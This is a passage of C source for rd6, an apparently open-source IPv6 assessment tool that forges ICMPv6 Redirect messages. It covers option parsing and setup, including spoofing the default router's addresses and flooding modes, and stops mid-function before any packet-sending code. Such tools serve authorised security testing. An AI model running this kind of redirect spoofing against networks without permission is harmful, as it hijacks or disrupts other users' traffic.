/*
 * rd6: A security assessment tool that exploits potential flaws in the
 *      processing of ICMPv6 Redirect messages
 *
 * Copyright (C) 2011-2013 Fernando Gont
 *
 * Programmed by Fernando Gont for SI6 Networks <http://www.si6networks.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 * Build with: make rd6
 * 
 * The libpcap library must be previously installed on your system.
 *
 * Please send any bug reports to Fernando Gont <fgont@si6networks.com>
 */

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/select.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <getopt.h>
#include <unistd.h>
#include <string.h>
#include <pcap.h>

#include "rd6.h"
#include "libipv6.h"
#include "ipv6toolkit.h"


/* Function prototypes */
void				init_packet_data(struct iface_data *);
void				send_packet(struct iface_data *, const u_char *, struct pcap_pkthdr *);
void				print_attack_info(struct iface_data *);
void				usage(void);
void				print_help(void);

/* Flags used for the ICMPv6 Redirect (specifically) */ 
unsigned int		rediraddr_f=0, redirprefix_f=0, redirport_f=0, peeraddr_f=0, peerport_f=0;
unsigned int		rhtcp_f=0, rhudp_f=0, rhicmp6_f=0, norheader_f=0, rheader_f=0;
unsigned int		tcpseq_f=0, tcpack_f=0, tcpurg_f=0, tcpflags_f=0, tcpwin_f=0;
unsigned int		icmp6id_f=0, icmp6seq_f=0;
unsigned int		rhlength_f=0, floodr_f=0, respmcast_f=0, makeonlink_f=0;
unsigned int		ip6hoplimit_f=0, ip6length_f=0, rhdefault_f=0;
unsigned int		learnrouter_f=0, sanityfilters_f=0;

/* Variables used for ICMPv6 Redirect (specifically) */

u_int16_t			ip6length;
struct in6_addr		rediraddr, peeraddr;
unsigned char		redirpreflen, targetpreflen;
u_int16_t			redirport, peerport, tcpurg, tcpwin, icmp6id, icmp6seq;
u_int32_t			tcpseq, tcpack;
u_int8_t			tcpflags=0, ip6hoplimit;
struct ip6_hdr		*rhipv6;
struct udp_hdr		*rhudp;
struct tcp_hdr		*rhtcp;
struct icmp6_hdr	*rhicmp6;
unsigned int		nredirs, redirs;
unsigned int		rhbytes, rhlength, currentsize;
unsigned char		rh_hoplimit;
struct nd_opt_rd_hdr	*rh;
unsigned char		rhbuff[100]; /* This one must be able to hold the IPv6 header and the upper layer header */


/* Variables used for learning the default router */
struct ether_addr		router_ether, rs_ether;
struct in6_addr			router_ipv6, rs_ipv6;


/* Data structures for packets read from the wire */
struct pcap_pkthdr		*pkthdr;
const u_char			*pktdata;
unsigned char			*pkt_end;
struct ether_header		*pkt_ether;
struct ip6_hdr			*pkt_ipv6;
struct in6_addr			*pkt_ipv6addr;
unsigned int			pktbytes;


bpf_u_int32				my_netmask;
bpf_u_int32				my_ip;
struct bpf_program		pcap_filter;
char 					dev[64], errbuf[PCAP_ERRBUF_SIZE];
unsigned char			buffer[65556], buffrh[MIN_IPV6_HLEN + MIN_TCP_HLEN];
unsigned char			*v6buffer, *ptr, *startofprefixes;
char					*pref;
struct ip6_hdr			*ipv6;
struct nd_redirect		*rd;
struct ether_header		*ethernet;
struct nd_opt_tlla		*tllaopt;
struct in6_addr			targetaddr;
struct ether_addr		linkaddr[MAX_TLLA_OPTION];
unsigned int			nlinkaddr=0, linkaddrs;

char					*lasts, *rpref;
char					*charptr;
size_t					nw;
unsigned long			ul_res, ul_val;
unsigned int			i, j, startrand;
unsigned int			skip;
unsigned int			ntargets, sources, nsources, targets, nsleep;

u_int16_t				mask;
u_int8_t				hoplimit;

char 					plinkaddr[ETHER_ADDR_PLEN];
char 					psrcaddr[INET6_ADDRSTRLEN], pdstaddr[INET6_ADDRSTRLEN], pv6addr[INET6_ADDRSTRLEN];
unsigned char 			floodt_f=0, targetaddr_f=0, useaddrkey_f=0;
unsigned char 			multicastdst_f=0, accepted_f=0, loop_f=0, sleep_f=0;
unsigned char			tllaopt_f=0, tllaopta_f=0, targetprefix_f=0, hoplimit_f=0;
unsigned char			newdata_f=0, floods_f=0;

/* Support for Extension Headers */
unsigned int			dstopthdrs, dstoptuhdrs, hbhopthdrs;
char					hbhopthdr_f=0, dstoptuhdr_f=0, dstopthdr_f=0;
unsigned char			*dstopthdr[MAX_DST_OPT_HDR], *dstoptuhdr[MAX_DST_OPT_U_HDR];
unsigned char			*hbhopthdr[MAX_HBH_OPT_HDR];
unsigned int			dstopthdrlen[MAX_DST_OPT_HDR], dstoptuhdrlen[MAX_DST_OPT_U_HDR];
unsigned int			hbhopthdrlen[MAX_HBH_OPT_HDR], m, pad;

struct ip6_frag			fraghdr, *fh;
struct ip6_hdr			*fipv6;
unsigned char			fragh_f=0;
unsigned char			fragbuffer[ETHER_HDR_LEN+MIN_IPV6_HLEN+MAX_IPV6_PAYLOAD];
unsigned char			*fragpart, *fptr, *fptrend, *ptrend, *ptrhdr, *ptrhdrend;
unsigned int			hdrlen, ndstopthdr=0, nhbhopthdr=0, ndstoptuhdr=0;
unsigned int			nfrags, fragsize;
unsigned char			*prev_nh, *startoffragment;

struct iface_data		idata;
struct filters			filters;

int main(int argc, char **argv){
	extern char		*optarg;	
	char			*endptr; /* Used by strtoul() */
	int				r, sel;
	fd_set			sset, rset;

	static struct option longopts[] = {
		{"interface", required_argument, 0, 'i'},
		{"src-address", required_argument, 0, 's'},
		{"dst-address", required_argument, 0, 'd'},
		{"hop-limit", required_argument, 0, 'A'},
		{"dst-opt-hdr", required_argument, 0, 'u'},
		{"dst-opt-u-hdr", required_argument, 0, 'U'},
		{"hbh-opt-hdr", required_argument, 0, 'H'},
		{"frag-hdr", required_argument, 0, 'y'},
		{"link-src-addr", required_argument, 0, 'S'},
		{"link-dst-addr", required_argument, 0, 'D'},
		{"add-target-opt", no_argument, 0, 'e'},
		{"target-addr-opt", required_argument, 0, 'E'},
		{"redir-dest", required_argument, 0, 'r'},
		{"redir-target", required_argument, 0, 't'},
		{"payload-type", required_argument, 0, 'p'},
		{"payload-size", required_argument, 0, 'P'},
		{"no-payload", no_argument, 0, 'n'},
		{"ipv6-hlim", required_argument, 0, 'c'},
		{"peer-addr", required_argument, 0, 'x'},
		{"redir-port", required_argument, 0, 'o'},
		{"peer-port", required_argument, 0, 'a'},
		{"tcp-flags", required_argument, 0, 'X'},
		{"tcp-seq", required_argument, 0, 'q'},
		{"tcp-ack", required_argument, 0, 'Q'},
		{"tcp-urg", required_argument, 0, 'V'},
		{"tcp-win", required_argument, 0, 'w'},
		{"resp-mcast", no_argument, 0, 'M'},
		{"make-onlink", no_argument, 0, 'O'},
		{"learn-router", no_argument, 0, 'N'},
		{"block-src-addr", required_argument, 0, 'j'},
		{"block-dst-addr", required_argument, 0, 'k'},
		{"block-link-src-addr", required_argument, 0, 'J'},
		{"block-link-dst-addr", required_argument, 0, 'K'},
		{"accept-src-addr", required_argument, 0, 'b'},
		{"accept-dst-addr", required_argument, 0, 'g'},
		{"accept-link-src-addr", required_argument, 0, 'B'},
		{"accept-link-dst-addr", required_argument, 0, 'G'},
		{"sanity-filters", no_argument, 0, 'f'},
		{"flood-dests", required_argument, 0, 'R'},
		{"flood-targets", required_argument, 0, 'T'},
		{"flood-sources", required_argument, 0, 'F'},
		{"loop", no_argument, 0, 'l'},
		{"sleep", required_argument, 0, 'z'},
		{"listen", no_argument, 0, 'L'},
		{"verbose", no_argument, 0, 'v'},
		{"help", no_argument, 0, 'h'}
	};

	char shortopts[]= "i:s:d:A:u:U:H:y:S:D:eE:r:t:p:P:nc:x:o:a:X:q:Q:V:w:MONj:k:J:K:b:g:B:G:fR:T:F:lz:Lvh";

	char option;

	if(argc<=1){
		usage();
		exit(EXIT_FAILURE);
	}

	hoplimit=255;

	/* Initialize filters structure */
	if(init_filters(&filters) == -1){
		puts("Error initializing internal data structure");
		exit(EXIT_FAILURE);
	}

	if(init_iface_data(&idata) == FAILURE){
		puts("Error initializing internal data structure");
		exit(EXIT_FAILURE);
	}

	while((r=getopt_long(argc, argv, shortopts, longopts, NULL)) != -1) {
		option= r;

		switch(option) {
			case 'i':  /* Interface */
				strncpy(idata.iface, optarg, IFACE_LENGTH-1);
				idata.iface[IFACE_LENGTH-1]=0;
				idata.iface_f=1;
				break;

			case 's':	/* IPv6 Source Address */
				if(idata.srcaddr_f){
					puts("Error: Multiple '-s' options have been specified");
					exit(EXIT_FAILURE);
				}

				if((charptr = strtok_r(optarg, "/", &lasts)) == NULL){
					puts("Error in Source Address");
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, charptr, &(idata.srcaddr)) <= 0){
					puts("inet_pton(): Source Address not valid");
					exit(EXIT_FAILURE);
				}

				idata.srcaddr_f = 1;
		
				if((charptr = strtok_r(NULL, " ", &lasts)) != NULL){
					idata.srcpreflen = atoi(charptr);
		
					if(idata.srcpreflen>128){
						puts("Prefix length error in IPv6 Source Address");
						exit(EXIT_FAILURE);
					}

					if(idata.srcpreflen == 64)
						useaddrkey_f= 1;

					sanitize_ipv6_prefix(&(idata.srcaddr), idata.srcpreflen);
					idata.srcprefix_f=1;
				}

				break;
	    
			case 'd':	/* IPv6 Destination Address */
				if( inet_pton(AF_INET6, optarg, &(idata.dstaddr)) <= 0){
					puts("inet_pton(): address not valid");
					exit(EXIT_FAILURE);
				}
		
				idata.dstaddr_f = 1;
				break;

			case 'A':	/* Hop Limit */
				hoplimit= atoi(optarg);
				hoplimit_f=1;
				break;

			case 'u':	/* Destinations Options Header */
				if(ndstopthdr >= MAX_DST_OPT_HDR){
					puts("Too many Destination Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				dstopthdrlen[ndstopthdr]= hdrlen;

				if( (dstopthdr[ndstopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstopthdr[ndstopthdr] + 2;
				ptrhdrend= dstopthdr[ndstopthdr] + hdrlen;

				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;
			
					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header Too Big");
						exit(EXIT_FAILURE);
					}
		    
					ptrhdr= ptrhdr + pad;
				}

				*(dstopthdr[ndstopthdr]+1)= (hdrlen/8)-1;
				ndstopthdr++;
				dstopthdr_f=1;
				break;

			case 'U':	/* Destination Options Header (Unfragmentable Part) */
				if(ndstoptuhdr >= MAX_DST_OPT_U_HDR){
					puts("Too many Destination Options Headers (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen = ((hdrlen+7)/8) * 8;
				dstoptuhdrlen[ndstoptuhdr]= hdrlen;
		
				if( (dstoptuhdr[ndstoptuhdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstoptuhdr[ndstoptuhdr]+2;
				ptrhdrend= dstoptuhdr[ndstoptuhdr] + hdrlen;
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header (Unfragmentable Part) Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(dstoptuhdr[ndstoptuhdr]+1)= (hdrlen/8) - 1;
				ndstoptuhdr++;
				dstoptuhdr_f=1;
				break;

			case 'H':	/* Hop-by-Hop Options Header */
				if(nhbhopthdr >= MAX_HBH_OPT_HDR){
					puts("Too many Hop-by-Hop Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen <= 8){
					puts("Bad length in Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				hbhopthdrlen[nhbhopthdr]= hdrlen;
		
				if( (hbhopthdr[nhbhopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= hbhopthdr[nhbhopthdr] + 2;
				ptrhdrend= hbhopthdr[nhbhopthdr] + hdrlen;
		
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Hop-by-Hop Options Header Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(hbhopthdr[nhbhopthdr]+1)= (hdrlen/8) - 1;
				nhbhopthdr++;
				hbhopthdr_f=1;
				break;

			case 'y':	/* Fragment header */
				nfrags= atoi(optarg);
				if(nfrags < 8){
					puts("Error in Fragmentation option: Fragment Size must be at least 8 bytes");
					exit(EXIT_FAILURE);
				}
		
				nfrags = (nfrags +7) & 0xfff8;
				fragh_f= 1;
				break;

			case 'S':	/* Source Ethernet address */
				if(ether_pton(optarg, &idata.hsrcaddr, sizeof(idata.hsrcaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				idata.hsrcaddr_f = 1;
				break;

			case 'D':	/* Destination Ethernet Address */
				if(ether_pton(optarg, &idata.hdstaddr, sizeof(idata.hdstaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				idata.hdstaddr_f = 1;
				break;

			case 'e':	/* Add target link-layer option */
				tllaopt_f = 1;
				break;

			case 'E':	/* Target link-layer option */
				tllaopt_f = 1;
				if(ether_pton(optarg, &linkaddr[nlinkaddr], sizeof(struct ether_addr)) == 0){
					puts("Error in Source link-layer address option.");
					exit(EXIT_FAILURE);
				}

				nlinkaddr++;		
				tllaopta_f=1;
				break;

			case 'r':	/* IPv6 Redirected Address */

				if((charptr = strtok_r(optarg, "/", &lasts)) == NULL){
					puts("Error in Redirected Address");
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, charptr, &rediraddr) <= 0){
					puts("inet_pton(): Redirected Address not valid");
					exit(EXIT_FAILURE);
				}

				rediraddr_f = 1;
		
				if((charptr = strtok_r(NULL, " ", &lasts)) != NULL){
					redirpreflen = atoi(charptr);
		
					if(redirpreflen>128){
						puts("Prefix length error in IPv6 Source Address");
						exit(EXIT_FAILURE);
					}

					sanitize_ipv6_prefix(&rediraddr, redirpreflen);
					redirprefix_f=1;
				}

				break;

			case 't':	/* Target Address to which traffic will be redirected */
				if((charptr = strtok_r(optarg, "/", &lasts)) == NULL){
					puts("Error in Target Address");
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, charptr, &targetaddr) <= 0){
					puts("inet_pton(): Target Address not valid");
					exit(EXIT_FAILURE);
				}

				targetaddr_f = 1;
		
				if((charptr = strtok_r(NULL, " ", &lasts)) != NULL){
		    			targetpreflen = atoi(charptr);
		
					if(targetpreflen>128){
						puts("Prefix length error in Target Address");
						exit(EXIT_FAILURE);
					}

					sanitize_ipv6_prefix(&targetaddr, targetpreflen);
					targetprefix_f=1;
				}

				break;

			case 'p':	/* Protocol used in the redirected header */
				if(strcmp(optarg, "TCP") == 0)
					rhtcp_f = 1;
				else if(strcmp(optarg, "ICMP6") == 0)
					rhicmp6_f = 1;
				else if(strcmp(optarg, "UDP") == 0)
					rhudp_f = 1;
				else{
					puts("Unsupported protocol in option '-p'");
					exit(EXIT_FAILURE);
				}
				break;

			case 'P':	/* Payload Size*/
				rhlength= atoi(optarg);
				rhlength= (rhlength<<3) >> 3; /* The Redirected Header has a granularity of 8 bytes */ 
				rhlength_f= 1;
				break;

			case 'n':	/* No Redirected Header */
				norheader_f=1;
				break;

			case 'c':	/* Hop Limit of the IPv6 Payload */
				ip6hoplimit= atoi(optarg);
				ip6hoplimit_f=1;
				break;

			case 'x':	/* Redirected peer address */
				if( inet_pton(AF_INET6, optarg, &peeraddr) <= 0){
					puts("inet_pton(): address not valid");
					exit(EXIT_FAILURE);
				}
		
				peeraddr_f = 1;
				break;

			case 'o':	/* Redir port */
				redirport= atoi(optarg);
				redirport_f= 1;
				break;

			case 'a':	/* Peer port */
				peerport= atoi(optarg);
				peerport_f= 1;
				break;

			case 'X':
				charptr = optarg;
				while(*charptr){
					switch(*charptr){
						case 'F':
							tcpflags= tcpflags | TH_FIN;
							break;

						case 'S':
							tcpflags= tcpflags | TH_SYN;
							break;

						case 'R':
							tcpflags= tcpflags | TH_RST;
							break;

						case 'P':
							tcpflags= tcpflags | TH_PUSH;
							break;

						case 'A':
							tcpflags= tcpflags | TH_ACK;
							break;

						case 'U':
							tcpflags= tcpflags | TH_URG;
							break;

						case 'X': /* No TCP flags */
							break;

						default:
							printf("Unknown TCP flag '%c'\n", *charptr);
							exit(EXIT_FAILURE);
							break;
					}

					if(*charptr == 'X')
						break;

					charptr++;
				}

				tcpflags_f=1;
				break;

			case 'q':	/* TCP Sequence Number */
				if((ul_res = strtoul(optarg, &endptr, 0)) == ULONG_MAX){
					perror("Error in 'TCP Sequence NUmber' parameter");
					exit(EXIT_FAILURE);
				}
		
				if(endptr != optarg){
					tcpseq = ul_res;
					tcpseq_f=1;
				}

				break;

			case 'Q':	/* TCP Acknowledgement Number */
				if((ul_res = strtoul(optarg, &endptr, 0)) == ULONG_MAX){
					perror("Error in 'TCP Sequence NUmber' parameter");
					exit(EXIT_FAILURE);
				}
		
				if(endptr != optarg){
					tcpack = ul_res;
					tcpack_f=1;
				}
				break;

			case 'V':	/* TCP Urgent Pointer */
				tcpurg= atoi(optarg);
				tcpurg_f= 1;
				break;

			case 'w':	/* TCP Window */
				tcpwin= atoi(optarg);
				tcpwin_f=1;
				break;

			case 'M':	/* Respond to multicast packets */
				respmcast_f=1;
				break;

			case 'O':	/* Make Destination On-Link */
				makeonlink_f=1;
				break;

			case 'N':	/* Learn Router */
				learnrouter_f= 1;
				break;

			case 'j':	/* IPv6 Source Address (block) filter */
				if(filters.nblocksrc >= MAX_BLOCK_SRC){
					puts("Too many IPv6 Source Address (block) filters.");
					exit(EXIT_FAILURE);
				}
	    
				if((pref = strtok_r(optarg, "/", &lasts)) == NULL){
					printf("Error in IPv6 Source Address (block) filter number %u.\n", \
												filters.nblocksrc+1);
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, pref, &(filters.blocksrc[filters.nblocksrc])) <= 0){
					printf("Error in IPv6 Source Address (block) filter number %u.", \
											    filters.nblocksrc+1);
					exit(EXIT_FAILURE);
				}

				if((charptr = strtok_r(NULL, " ", &lasts)) == NULL){
		    			filters.blocksrclen[filters.nblocksrc] = 128;
				}
				else{
					filters.blocksrclen[filters.nblocksrc] = atoi(charptr);

					if(filters.blocksrclen[filters.nblocksrc]>128){
						printf("Length error in IPv6 Source Address (block) filter number %u.\n", \
													filters.nblocksrc+1);
						exit(EXIT_FAILURE);
		    			}
				}

				sanitize_ipv6_prefix(&(filters.blocksrc[filters.nblocksrc]), filters.blocksrclen[filters.nblocksrc]);
				(filters.nblocksrc)++;
				break;

			case 'k':	/* IPv6 Destination Address (block) filter */
				if(filters.nblockdst >= MAX_BLOCK_DST){
					puts("Too many IPv6 Destination Address (block) filters.");
					exit(EXIT_FAILURE);
				}

				if((pref = strtok_r(optarg, "/", &lasts)) == NULL){
					printf("Error in IPv6 Destination Address (block) filter number %u.\n", \
													filters.nblockdst+1);
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, pref, &(filters.blockdst[filters.nblockdst])) <= 0){
					printf("Error in IPv6 Source Address (block) filter number %u.", \
											    filters.nblockdst+1);
					exit(EXIT_FAILURE);
				}

				if((charptr = strtok_r(NULL, " ", &lasts)) == NULL){
					filters.blockdstlen[filters.nblockdst] = 128;
				}
				else{
					filters.blockdstlen[filters.nblockdst] = atoi(charptr);
		
					if(filters.blockdstlen[filters.nblockdst]>128){
						printf("Length error in IPv6 Source Address (block) filter number %u.\n", \
													    filters.nblockdst+1);
						exit(EXIT_FAILURE);
					}
				}
		
				sanitize_ipv6_prefix(&(filters.blockdst[filters.nblockdst]), filters.blockdstlen[filters.nblockdst]);
				(filters.nblockdst)++;
				break;

			case 'J':	/* Link Source Address (block) filter */
				if(filters.nblocklinksrc > MAX_BLOCK_LINK_SRC){
					puts("Too many link-layer Source Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if(ether_pton(optarg, &(filters.blocklinksrc[filters.nblocklinksrc]), sizeof(struct ether_addr)) == 0){
					printf("Error in link-layer Source Address (blick) filter number %u.\n", \
												    filters.nblocklinksrc+1);
					exit(EXIT_FAILURE);
				}
		
				(filters.nblocklinksrc)++;
				break;

			case 'K':	/* Link Destination Address (block) filter */
				if(filters.nblocklinkdst > MAX_BLOCK_LINK_DST){
					puts("Too many link-layer Destination Address (block) filters.");
					exit(EXIT_FAILURE);
				}

				if(ether_pton(optarg, &(filters.blocklinkdst[filters.nblocklinkdst]), sizeof(struct ether_addr)) == 0){
					printf("Error in link-layer Destination Address (blick) filter number %u.\n", \
												    filters.nblocklinkdst+1);
					exit(EXIT_FAILURE);
				}
		
				filters.nblocklinkdst++;
				break;

			case 'b':	/* IPv6 Source Address (accept) filter */
				if(filters.nacceptsrc > MAX_ACCEPT_SRC){
					puts("Too many IPv6 Source Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if((pref = strtok_r(optarg, "/", &lasts)) == NULL){
					printf("Error in IPv6 Source Address (accept) filter number %u.\n", \
												filters.nacceptsrc+1);
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, pref, &(filters.acceptsrc[filters.nacceptsrc])) <= 0){
					printf("Error in IPv6 Source Address (accept) filter number %u.\n", \
												filters.nacceptsrc+1);
					exit(EXIT_FAILURE);
				}
		
				if((charptr = strtok_r(NULL, " ", &lasts)) == NULL){
					filters.acceptsrclen[filters.nacceptsrc] = 128;
				}
				else{
					filters.acceptsrclen[filters.nacceptsrc] = atoi(charptr);

					if(filters.acceptsrclen[filters.nacceptsrc]>128){
						printf("Length error in IPv6 Source Address (accept) filter number %u.\n", \
														filters.nacceptsrc+1);
						exit(EXIT_FAILURE);
					}
				}

				sanitize_ipv6_prefix(&(filters.acceptsrc[filters.nacceptsrc]), filters.acceptsrclen[filters.nacceptsrc]);
				(filters.nacceptsrc)++;
				filters.acceptfilters_f=1;
				break;


			case 'g':	/* IPv6 Destination Address (accept) filter */
				if(filters.nacceptdst > MAX_ACCEPT_DST){
					puts("Too many IPv6 Destination Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if((pref = strtok_r(optarg, "/", &lasts)) == NULL){
					printf("Error in IPv6 Destination Address (accept) filter number %u.\n", \
													filters.nacceptdst+1);
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, pref, &(filters.acceptdst[filters.nacceptdst])) <= 0){
					printf("Error in IPv6 Source Address (accept) filter number %u.\n", \
												    filters.nacceptdst+1);
					exit(EXIT_FAILURE);
				}

				if((charptr = strtok_r(NULL, " ", &lasts)) == NULL){
					filters.acceptdstlen[filters.nacceptdst] = 128;
				}
				else{
					filters.acceptdstlen[filters.nacceptdst] = atoi(charptr);
		
					if(filters.acceptdstlen[filters.nacceptdst] > 128){
						printf("Length error in IPv6 Source Address (accept) filter number %u.\n", \
													    filters.nacceptdst+1);
						exit(EXIT_FAILURE);
					}
				}
		
				sanitize_ipv6_prefix(&(filters.acceptdst[filters.nacceptdst]), filters.acceptdstlen[filters.nacceptdst]);
				(filters.nacceptdst)++;
				filters.acceptfilters_f=1;
				break;

			case 'B':	/* Link-layer Source Address (accept) filter */
				if(filters.nacceptlinksrc > MAX_ACCEPT_LINK_SRC){
					puts("Too many link-later Source Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if(ether_pton(optarg, &(filters.acceptlinksrc[filters.nacceptlinksrc]), sizeof(struct ether_addr)) == 0){
					printf("Error in link-layer Source Address (accept) filter number %u.\n", \
											    filters.nacceptlinksrc+1);
					exit(EXIT_FAILURE);
				}
		
				(filters.nacceptlinksrc)++;
				filters.acceptfilters_f=1;
				break;

			case 'G':	/* Link Destination Address (accept) filter */
				if(filters.nacceptlinkdst > MAX_ACCEPT_LINK_DST){
					puts("Too many link-layer Destination Address (accept) filters.");
					exit(EXIT_FAILURE);
				}

				if(ether_pton(optarg, &(filters.acceptlinkdst[filters.nacceptlinkdst]), sizeof(struct ether_addr)) == 0){
					printf("Error in link-layer Destination Address (accept) filter number %u.\n",\
												    filters.nacceptlinkdst+1);
					exit(EXIT_FAILURE);
				}
		
				(filters.nacceptlinkdst)++;
				filters.acceptfilters_f=1;
				break;

			case 'f':	/* Sanity filters */
				sanityfilters_f=1;
				break;

			case 'R':      /* Flood Redirected */
				nredirs= atoi(optarg);

				if(nredirs == 0){
					puts("Invalid number of Redirects in option -R");
					exit(EXIT_FAILURE);
				}

				floodr_f= 1;
				break;

			case 'T':	/* Flood targets */
				ntargets= atoi(optarg);
				if(ntargets == 0){
					puts("Invalid number of Target Addresses in option -T");
					exit(EXIT_FAILURE);
				}
		
				floodt_f= 1;
				break;

			case 'F':	/* Flood sources */
				nsources= atoi(optarg);
				if(nsources == 0){
					puts("Invalid number of sources in option -F");
					exit(EXIT_FAILURE);
				}
		
				floods_f= 1;
				break;

			case 'l':	/* "Loop mode */
				loop_f = 1;
				break;

			case 'z':	/* Sleep option */
				nsleep=atoi(optarg);
				if(nsleep==0){
					puts("Invalid number of seconds in '-z' option");
					exit(EXIT_FAILURE);
				}
	
				sleep_f=1;
				break;

			case 'L':	/* "Listen mode */
				idata.listen_f = 1;
				break;

			case 'v':	/* Be verbose */
				idata.verbose_f++;
				break;
		
			case 'h':	/* Help */
				print_help();
		
				exit(EXIT_FAILURE);
				break;

			default:
				usage();
				exit(EXIT_FAILURE);
				break;
		
		} /* switch */
	} /* while(getopt) */

	if(geteuid()) {
		puts("rd6 needs root privileges to run.");
		exit(EXIT_FAILURE);
	}

	if(!idata.iface_f){
		if(idata.dstaddr_f && IN6_IS_ADDR_LINKLOCAL(&(idata.dstaddr))){
			puts("Must specify a network interface for link-local destinations");
			exit(EXIT_FAILURE);
		}
		else if(idata.listen_f){
			puts("Must specify a network interface when employing the 'listenging' mode");
			exit(EXIT_FAILURE);
		}
	}

	if(idata.listen_f && loop_f){
		puts("'Error: listen' mode and 'loop' mode are incompatible");
		exit(EXIT_FAILURE);
	}

	/*
	  If the flood option ("-F") has been specified, but no prefix has been specified,
	  select the random Source Addresses from the link-local unicast prefix (fe80::/64).
	*/
	if(floods_f && !idata.srcprefix_f){
		idata.srcaddr.s6_addr16[0]= htons(0xfe80); /* Link-local unicast prefix */

		for(i=1;i<8;i++)
			idata.srcaddr.s6_addr16[i]=0x0000;
	
		idata.srcpreflen=64;
	}

	if(!floods_f && !idata.srcaddr_f && !learnrouter_f){
		puts("Must specify IPv6 Source Address (usually to that of the current default router)");
		exit(EXIT_FAILURE);
	}

	if(!idata.dstaddr_f && !idata.listen_f){	/* Must specify IPv6 Destination Address if listening mode not used */
		puts("IPv6 Destination Address not specified (and listening mode not selected)");
		exit(EXIT_FAILURE);
	}

	if(!idata.hsrcaddr_f && !learnrouter_f)	/* Source link-layer address is randomized by default */
		for(i=0; i<6; i++)
			idata.hsrcaddr.a[i]= random();

	if(!idata.hdstaddr_f && idata.dstaddr_f){
		if(ether_pton(ETHER_ALLNODES_LINK_ADDR, &idata.hdstaddr, sizeof(idata.hdstaddr)) == 0){
			puts("ether_pton(): Error converting all-nodes multicast address");
			exit(EXIT_FAILURE);
		}
	}

	if(load_dst_and_pcap(&idata, (idata.dstaddr_f?LOAD_SRC_NXT_HOP:LOAD_PCAP_ONLY)) == FAILURE){
		puts("Error while learning Souce Address and Next Hop");
		exit(EXIT_FAILURE);
	}

	if(learnrouter_f){
		randomize_ether_addr(&rs_ether);
		ether_to_ipv6_linklocal(&rs_ether, &rs_ipv6);

		if(find_ipv6_router(idata.pfd, &rs_ether, &rs_ipv6, &router_ether, &router_ipv6) != 0){
			puts("Failed learning default IPv6 router");
			exit(EXIT_FAILURE);
		}

		if(!idata.hsrcaddr_f){
			idata.hsrcaddr= router_ether;
			idata.hsrcaddr_f=1;
		}

		if(!idata.srcaddr_f){
			idata.srcaddr= router_ipv6;
			idata.srcaddr_f= 1;
		}
	}

	release_privileges();
	srandom(time(NULL));

	if(tllaopt_f && !tllaopta_f){
		if(idata.hsrcaddr_f){					/* The value of the target link-layer address      */
			linkaddr[0] = idata.hsrcaddr;			/* option defaults to the Ethernet Source Address  */
			nlinkaddr++;
		}
		else{
			puts("Must specify the link-layer Source Address when the '-e' option is selected");
			exit(EXIT_FAILURE);
		}
	}


	/*
	   If the flood target option ("-T") was specified, but no prefix was specified,
	   select the random Target Addresses from the link-local unicast prefix (fe80::/64).
	*/
	if(floodt_f && !targetprefix_f){
